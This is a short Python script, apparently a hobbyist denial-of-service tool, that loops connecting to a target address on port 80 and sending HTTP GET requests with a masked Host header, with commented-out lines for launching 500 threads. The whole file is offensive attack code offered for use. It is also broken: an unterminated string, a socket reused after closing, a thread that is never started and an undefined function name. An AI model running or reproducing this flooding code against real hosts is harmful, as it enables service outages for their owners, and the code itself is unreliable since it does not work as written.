import os
import socket
import keyboard
import threading


class DenialOfService(object):
    def __init__(self, target="192.168.8.1", port=80, ip_mask="182.21.20.32"):
        self.target = target
        self.port = port
        self.ip_mask = ip_mask
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    
    def control(self):
        thread = threading.Thread(target=self.attack)
        os.system("cls")
        print("[ - Denial of Service Attack - ]\n"
              "[ESC] Exit\n"
              "[ENTER] Start\n
              "[SPACE] Pause")
        
    

    def attack(self):
        print(f"Attack startet against: {self.target}")
        while True:
            self.connection.connect((self.target, self.port))
            self.connection.sendto((f"GET /{self.target} HTTP/1.1\r\n").encode("ascii"), (self.target, self.port))
            self.connection.sendto((f"Host: {self.ip_mask}\r\n\r\n").encode("ascii"), (self.target, self.port))
            self.connection.close()



# for i in range(500):
#     thread = threading.Thread(target=ddos)
#     thread.start()

